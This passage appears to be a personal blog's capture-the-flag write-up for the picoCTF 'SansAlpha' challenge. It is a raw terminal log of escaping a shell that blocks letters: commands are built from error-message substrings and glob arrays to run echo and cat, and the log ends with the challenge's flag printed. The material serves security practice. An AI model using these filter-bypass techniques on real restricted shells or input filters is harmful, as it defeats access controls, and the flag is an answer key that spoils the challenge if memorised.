@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html>
+    <head lang="en">
+        <meta charset="utf-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>SansAlpha - ~/xv1&#39;s projects</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href="../../../css/fonts.css" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" media="screen" href="../../../css/main.css" />
+    </head>
+    <body>
+        <div class="content">
+            <header>
+                <div class="main">
+                    <a href="../../../index.html">~/xv1&#39;s projects</a>
+                </div>
+                <nav>
+                    
+                    <a href="../../../writeups/index.html">./writeups</a>
+                    
+                </nav>
+            </header>
+            <main>
+                <article>
+                    <div class="title">
+                        <h1 class="title">SansAlpha</h1>
+                        <div class="meta">Posted on Mar 13, 2024</div>
+                    </div>
+                    <div class="post-tags">
+                        <nav class="nav tags">
+                            <ul class="tags">
+                                <li><a href="/tags/pico">pico</a></li>
+                            </ul>
+                        </nav>
+                    </div>
+                    <section class="body">
+                        <pre tabindex="0"><code>xv1-picoctf@webshell:~$ ssh -p 49621 ctf-player@mimas.picoctf.net
+The authenticity of host &#39;[mimas.picoctf.net]:49621 ([52.15.88.75]:49621)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:n/hDgUtuTTF85Id7k2fxmHvb6rrLrACHNM6xLZ46AqQ.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;[mimas.picoctf.net]:49621&#39; (ED25519) to the list of known hosts.
+ctf-player@mimas.picoctf.net&#39;s password:
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1014-aws x86_64)
+
+ * Documentation:  http://help.ubuntu.com
+ * Management:     http://landscape.canonical.com
+ * Support:        http://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the &#39;unminimize&#39; command.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+SansAlpha$ ~
+bash: /home/ctf-player: Is a directory
+
+SansAlpha$ chsh
+SansAlpha: Unknown character detected
+SansAlpha$ =
+bash: =: command not found
+
+SansAlpha$ +
+bash: +: command not found
+
+SansAlpha$ \
+SansAlpha: Unknown character detected
+SansAlpha$ /
+bash: /: Is a directory
+
+SansAlpha$ //
+bash: //: Is a directory
+
+SansAlpha$ ///
+bash: ///: Is a directory
+
+SansAlpha$ ////
+bash: ////: Is a directory
+
+SansAlpha$ /\/
+SansAlpha: Unknown character detected
+SansAlpha$ /|
+&gt;
+SansAlpha$ | &#39;ls&#39;
+SansAlpha: Unknown character detected
+SansAlpha$ |&#39;
+bash: syntax error near unexpected token `|&#39;
+
+SansAlpha$ |
+bash: syntax error near unexpected token `|&#39;
+
+SansAlpha$ /|
+&gt;
+SansAlpha$ /|/
+bash: /: Is a directory
+bash: /: Is a directory
+bash: /: Is a directory
+
+SansAlpha$ |~
+bash: syntax error near unexpected token `|&#39;
+
+SansAlpha$ /|~
+bash: /: Is a directory
+bash: /home/ctf-player: Is a directory
+
+SansAlpha$ |~*
+bash: syntax error near unexpected token `|&#39;
+
+SansAlpha$ ~*
+bash: ~*: command not found
+
+SansAlpha$ /*
+bash: /bin: Is a directory
+
+SansAlpha$ *
+bash: blargh: command not found
+
+SansAlpha$ !
+SansAlpha$ @
+bash: @: command not found
+
+SansAlpha$ #
+SansAlpha$ $
+bash: $: command not found
+
+SansAlpha$ %
+bash: fg: %: no such job
+
+SansAlpha$ ^
+bash: :s^: no previous substitution
+
+SansAlpha$ &amp;
+bash: syntax error near unexpected token `&amp;&#39;
+
+SansAlpha$ *
+bash: blargh: command not found
+
+SansAlpha$ (
+&gt;
+SansAlpha$ )
+bash: syntax error near unexpected token `)&#39;
+
+SansAlpha$ -
+bash: -: command not found
+
+SansAlpha$ _
+bash: _: command not found
+
+SansAlpha$ +
+bash: +: command not found
+
+SansAlpha$ =
+bash: =: command not found
+
+SansAlpha$ !ls
+SansAlpha: Unknown character detected
+SansAlpha$ !*
+
+
+SansAlpha$ !/
+/*
+bash: /bin: Is a directory
+
+SansAlpha$ !~
+~*
+bash: ~*: command not found
+
+SansAlpha$ !~/*
+bash: !~/: event not found
+
+SansAlpha$ !~/
+bash: !~/: event not found
+
+SansAlpha$ !~*/
+/
+bash: /: Is a directory
+
+SansAlpha$ !#
+
+
+SansAlpha$ #!/
+SansAlpha$ #!~
+SansAlpha$ #!/bin/bash/ls
+SansAlpha: Unknown character detected
+SansAlpha$ !#~
+~
+bash: /home/ctf-player: Is a directory
+
+SansAlpha$ #!/*
+SansAlpha$ #!*/
+SansAlpha$ #!~
+SansAlpha$ #!*~
+SansAlpha$ #!~*
+SansAlpha$ #!^L
+SansAlpha: Unknown character detected
+SansAlpha$ #!^
+SansAlpha$ #!^~
+SansAlpha$ #!:^
+SansAlpha$ :
+SansAlpha$ ;
+bash: syntax error near unexpected token `;&#39;
+
+SansAlpha$ !#;~
+;~
+bash: syntax error near unexpected token `;&#39;
+
+SansAlpha$ !#; ~/*
+; ~/*
+bash: syntax error near unexpected token `;&#39;
+
+SansAlpha$ /*
+bash: /bin: Is a directory
+
+SansAlpha$ /*/*
+/bin/[: missing ‘]’
+
+SansAlpha$ /*/*]
+bash: /*/*]: No such file or directory
+
+SansAlpha$ /*/
+bash: /bin/: Is a directory
+
+SansAlpha$ /*/*ls]
+SansAlpha: Unknown character detected
+SansAlpha$ /*/*
+/bin/[: missing ‘]’
+
+SansAlpha$ /*/[
+/bin/[: missing ‘]’
+
+SansAlpha$ /*/[]
+bash: /*/[]: No such file or directory
+
+SansAlpha$ /*/[!]
+bash: /*/[!]: No such file or directory
+
+SansAlpha$ /*/[@]
+bash: /*/[@]: No such file or directory
+
+SansAlpha$ /*/[#]
+bash: /*/[#]: No such file or directory
+
+SansAlpha$ /*/#
+bash: /*/#: No such file or directory
+
+SansAlpha$ /*/!
+bash: /*/!: No such file or directory
+
+SansAlpha$ /*/*|~
+bash: /home/ctf-player: Is a directory
+/bin/[: missing ‘]’
+
+SansAlpha$ ./*/[
+bash: ./*/[: No such file or directory
+
+SansAlpha$ &gt;
+bash: syntax error near unexpected token `newline&#39;
+
+SansAlpha$ &lt;
+bash: syntax error near unexpected token `newline&#39;
+
+SansAlpha$ ?
+bash: ?: command not found
+
+SansAlpha$ /
+bash: /: Is a directory
+
+SansAlpha$ `
+&gt;
+SansAlpha$ &#39;
+&gt;
+SansAlpha$ {
+&gt;
+SansAlpha$ *l
+SansAlpha: Unknown character detected
+SansAlpha$ !-1
+/
+&gt;
+SansAlpha$ ls
+SansAlpha: Unknown character detected
+SansAlpha$ !-1
+/
+&gt;
+SansAlpha$ $0
+&gt;
+SansAlpha$ ${0/-/}
+&gt;
+SansAlpha$ !-3
+&lt;
+&gt;
+SansAlpha$ !-9
+/*/#
+&gt;
+SansAlpha$ la -la
+SansAlpha: Unknown character detected
+SansAlpha$ ls -la
+SansAlpha: Unknown character detected
+SansAlpha$ !-1
+/
+&gt;
+SansAlpha$ !!
+/
+&gt;
+SansAlpha$ --
+&gt;
+SansAlpha$ ,
+&gt;
+SansAlpha$ #cat
+SansAlpha: Unknown character detected
+SansAlpha$ !/*
+
+&gt;
+SansAlpha$ !~/*
+bash: !~/: event not found
+&gt;
+SansAlpha$ ~/*!!
+~/*/
+&gt;
+SansAlpha$ ls
+SansAlpha: Unknown character detected
+SansAlpha$ ~/*!-1
+~/*/
+&gt;
+SansAlpha$ &#34;$(- 2&gt;&amp;1)&#34;;${_%%:*}
+&gt;
+SansAlpha$ ./*/*
+bash: ./blargh/flag.txt: Permission denied
+SansAlpha$ /*/*
+/bin/[: missing ‘]’
+
+SansAlpha$ /*/*]
+bash: /*/*]: No such file or directory
+
+SansAlpha$ ../*/*
+bash: ../ctf-player/blargh: Is a directory
+
+SansAlpha$ ./*/*
+bash: ./blargh/flag.txt: Permission denied
+
+SansAlpha$ /*/*/
+bash: /dev/fd/: Is a directory
+
+SansAlpha$ /*/*/*
+bash: /dev/fd/0: Permission denied
+
+SansAlpha$ $(&lt;/./*/*)
+bash: /./*/*: ambiguous redirect
+
+SansAlpha$
+Traceback (most recent call last):
+  File &#34;/usr/local/sansalpha.py&#34;, line 12, in &lt;module&gt;
+    if user_in[-1] != &#34;\n&#34;:
+IndexError: string index out of range
+
+xv1-picoctf@webshell:~$ ssh -p 59899 ctf-player@mimas.picoctf.net &#34;echo $(/*/*)&#34;
+RefactoringTool: Skipping optional fixer: buffer
+RefactoringTool: Skipping optional fixer: idioms
+RefactoringTool: Skipping optional fixer: set_literal
+RefactoringTool: Skipping optional fixer: ws_comma
+Traceback (most recent call last):
+  File &#34;/bin/2to3-2.7&#34;, line 5, in &lt;module&gt;
+    sys.exit(main(&#34;lib2to3.fixes&#34;))
+  File &#34;/usr/lib/python2.7/lib2to3/main.py&#34;, line 260, in main
+    options.processes)
+  File &#34;/usr/lib/python2.7/lib2to3/refactor.py&#34;, line 706, in refactor
+    items, write, doctests_only)
+  File &#34;/usr/lib/python2.7/lib2to3/refactor.py&#34;, line 301, in refactor
+    self.refactor_file(dir_or_file, write, doctests_only)
+  File &#34;/usr/lib/python2.7/lib2to3/refactor.py&#34;, line 747, in refactor_file
+    *args, **kwargs)
+  File &#34;/usr/lib/python2.7/lib2to3/refactor.py&#34;, line 341, in refactor_file
+    input, encoding = self._read_python_source(filename)
+  File &#34;/usr/lib/python2.7/lib2to3/refactor.py&#34;, line 337, in _read_python_source
+    return _from_system_newlines(f.read()), encoding
+  File &#34;/usr/lib/python2.7/codecs.py&#34;, line 688, in read
+    return self.reader.read(size)
+  File &#34;/usr/lib/python2.7/codecs.py&#34;, line 494, in read
+    newchars, decodedbytes = self.decode(data, self.errors)
+UnicodeDecodeError: &#39;utf8&#39; codec can&#39;t decode byte 0xa0 in position 24: invalid start byte
+ctf-player@mimas.picoctf.net&#39;s password:
+Permission denied, please try again.
+ctf-player@mimas.picoctf.net&#39;s password:
+SansAlpha$ Warning: _curses.error: setupterm: could not find terminfo database
+
+Terminal features will not be available.  Consider setting TERM variable to your current terminal name (or xterm).
+
+Traceback (most recent call last):
+  File &#34;/usr/local/sansalpha.py&#34;, line 12, in &lt;module&gt;
+    if user_in[-1] != &#34;\n&#34;:
+IndexError: string index out of range
+
+SansAlpha$ /*/*/*/*
+bash: /etc/X11/Xsession.d/90gpg-agent: Permission denied
+
+# getting echo
+SansAlpha$ _1=$(/*/*/ 2&gt;&amp;1)
+SansAlpha$ ${_1:24:2}${_1:3:1}${_1:27:1} $_1
+bash: /dev/fd/: Is a directory
+
+SansAlpha$ ${_1:24:2}${_1:3:1}${_1:27:1} $(/*/*)
+/bin/[: missing ‘]’
+
+
+SansAlpha$ _2=(/*)
+SansAlpha$ ${_1:24:2}${_1:3:1}${_1:27:1} $_2
+/bin
+
+SansAlpha$ _2=(/*/*)
+SansAlpha$ ${_1:24:2}${_1:3:1}${_1:27:1} $_2
+/bin/[
+
+SansAlpha$ _2=(./*/*)
+SansAlpha$ ${_1:24:2}${_1:3:1}${_1:27:1} $_2
+./blargh/flag.txt
+
+# getting ls
+SansAlpha$ ${_1:24:2}${_1:3:1}${_1:27:1} ${_2[*]}
+./blargh/flag.txt ./blargh/on-alpha-9.txt
+
+# listing files
+SansAlpha$ _2=(/*)
+SansAlpha$ ${_1:24:2}${_1:3:1}${_1:27:1} ${_2[*]}
+/bin /boot /dev /etc /home /lib /lib32 /lib64 /libx32 /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var
+
+# listing bin
+SansAlpha$ _2=(/*)
+SansAlpha$ _2=(${_2[0]}/*)
+SansAlpha$ ${_1:24:2}${_1:3:1}${_1:27:1} ${_2[*]}
+/bin/[ /bin/addpart /bin/addr2line /bin/apt /bin/apt-cache /bin/apt-cdrom /bin/apt-config /bin/apt-get /bin/apt-key /bin/apt-mark /bin/ar /bin/arch /bin/as /bin/awk /bin/b2sum /bin/base32 /bin/base64 /bin/basename /bin/bash /bin/bashbug /bin/bootctl /bin/bunzip2 /bin/busctl /bin/bzcat /bin/bzcmp /bin/bzdiff /bin/bzegrep /bin/bzexe /bin/bzfgrep /bin/bzgrep /bin/bzip2 /bin/bzip2recover /bin/bzless /bin/bzmore /bin/c++ /bin/c++filt /bin/c89 /bin/c89-gcc /bin/c99 /bin/c99-gcc /bin/c_rehash /bin/captoinfo /bin/cat /bin/catchsegv /bin/cautious-launcher /bin/cc /bin/chage /bin/chardet3 /bin/chardetect3 /bin/chattr /bin/chcon /bin/chfn /bin/chgrp /bin/chmod /bin/choom /bin/chown /bin/chrt /bin/chsh /bin/cksum /bin/clear /bin/clear_console /bin/cmp /bin/comm /bin/compose /bin/corelist /bin/cp /bin/cpan /bin/cpan5.30-x86_64-linux-gnu /bin/cpp /bin/cpp-9 /bin/csplit /bin/cut /bin/dash /bin/date /bin/dbus-cleanup-sockets /bin/dbus-daemon /bin/dbus-monitor /bin/dbus-run-session /bin/dbus-send /bin/dbus-update-activation-environment /bin/dbus-uuidgen /bin/dd /bin/deb-systemd-helper /bin/deb-systemd-invoke /bin/debconf /bin/debconf-apt-progress /bin/debconf-communicate /bin/debconf-copydb /bin/debconf-escape /bin/debconf-set-selections /bin/debconf-show /bin/delpart /bin/df /bin/diff /bin/diff3 /bin/dir /bin/dircolors /bin/dirmngr /bin/dirmngr-client /bin/dirname /bin/dmesg /bin/dnsdomainname /bin/domainname /bin/dpkg /bin/dpkg-architecture /bin/dpkg-buildflags /bin/dpkg-buildpackage /bin/dpkg-checkbuilddeps /bin/dpkg-deb /bin/dpkg-distaddfile /bin/dpkg-divert /bin/dpkg-genbuildinfo /bin/dpkg-genchanges /bin/dpkg-gencontrol /bin/dpkg-gensymbols /bin/dpkg-maintscript-helper /bin/dpkg-mergechangelogs /bin/dpkg-name /bin/dpkg-parsechangelog /bin/dpkg-query /bin/dpkg-scanpackages /bin/dpkg-scansources /bin/dpkg-shlibdeps /bin/dpkg-source /bin/dpkg-split /bin/dpkg-statoverride /bin/dpkg-trigger /bin/dpkg-vendor /bin/du /bin/dwp /bin/echo /bin/edit /bin/egrep /bin/elfedit /bin/enc2xs /bin/encguess /bin/env /bin/expand /bin/expiry /bin/expr /bin/factor /bin/faillog /bin/faked-sysv /bin/faked-tcp /bin/fakeroot /bin/fakeroot-sysv /bin/fakeroot-tcp /bin/fallocate /bin/false /bin/fgrep /bin/filan /bin/file /bin/fincore /bin/find /bin/findmnt /bin/flock /bin/fmt /bin/fold /bin/free /bin/g++ /bin/g++-9 /bin/gcc /bin/gcc-9 /bin/gcc-ar /bin/gcc-ar-9 /bin/gcc-nm /bin/gcc-nm-9 /bin/gcc-ranlib /bin/gcc-ranlib-9 /bin/gcov /bin/gcov-9 /bin/gcov-dump /bin/gcov-dump-9 /bin/gcov-tool /bin/gcov-tool-9 /bin/gencat /bin/getconf /bin/getent /bin/getopt /bin/gold /bin/gpasswd /bin/gpg /bin/gpg-agent /bin/gpg-connect-agent /bin/gpg-wks-server /bin/gpg-zip /bin/gpgcompose /bin/gpgconf /bin/gpgparsemail /bin/gpgsm /bin/gpgsplit /bin/gpgtar /bin/gpgv /bin/gprof /bin/grep /bin/groups /bin/gunzip /bin/gzexe /bin/gzip /bin/h2ph /bin/h2xs /bin/head /bin/hostid /bin/hostname /bin/hostnamectl /bin/i386 /bin/iconv /bin/id /bin/infocmp /bin/infotocap /bin/install /bin/instmodsh /bin/ionice /bin/ipcmk /bin/ipcrm /bin/ipcs /bin/ischroot /bin/join /bin/journalctl /bin/json_pp /bin/kbxutil /bin/kernel-install /bin/kill /bin/last /bin/lastb /bin/lastlog /bin/lcf /bin/ld /bin/ld.bfd /bin/ld.gold /bin/ldd /bin/libnetcfg /bin/link /bin/linux32 /bin/linux64 /bin/ln /bin/locale /bin/locale-check /bin/localectl /bin/localedef /bin/logger /bin/login /bin/loginctl /bin/logname /bin/ls /bin/lsattr /bin/lsb_release /bin/lsblk /bin/lscpu /bin/lsipc /bin/lslocks /bin/lslogins /bin/lsmem /bin/lsns /bin/lspgpot /bin/lzcat /bin/lzcmp /bin/lzdiff /bin/lzegrep /bin/lzfgrep /bin/lzgrep /bin/lzless /bin/lzma /bin/lzmainfo /bin/lzmore /bin/make /bin/make-first-existing-target /bin/man /bin/mawk /bin/mcookie /bin/md5sum /bin/md5sum.textutils /bin/mesg /bin/migrate-pubring-from-classic-gpg /bin/mkdir /bin/mkfifo /bin/mknod /bin/mktemp /bin/more /bin/mount /bin/mountpoint /bin/mtrace /bin/mv /bin/namei /bin/nawk /bin/networkctl /bin/networkd-dispatcher /bin/newgrp /bin/nice /bin/nisdomainname /bin/nl /bin/nm /bin/nohup /bin/nproc /bin/nsenter /bin/numfmt /bin/objcopy /bin/objdump /bin/od /bin/openssl
+
+# listing home
+SansAlpha$ _2=(/*)
+SansAlpha$ _2=(${_2[4]}/*/*)
+SansAlpha$ ${_1:24:2}${_1:3:1}${_1:27:1} ${_2[*]}
+/home/ctf-player/blargh /home/ctf-player/on-calastran.txt
+
+SansAlpha$ ${_1:24:2}${_1:3:1}${_1:27:1} ${_2[0]}
+/home/ctf-player/blargh/flag.txt
+
+# getting the flag
+SansAlpha$ _2=(/*)
+SansAlpha$ _2=(${_2[0]}/*)
+SansAlpha$ _3=${_2[42]}
+SansAlpha$ _2=(/*)
+SansAlpha$ _2=(${_2[4]}/*/*/*)
+SansAlpha$ $_3 $_2
+return 0 picoCTF{7h15_mu171v3r53_15_m4dn355_145256ec}
+</code></pre>
+                    </section>
+                </article>
+            </main>
+            <footer>
+                <div class="footer-info">
+                    xv1 2024-4L 
+                    
+                </div>
+            </footer>
+        </div>
+    </body>
+</html>
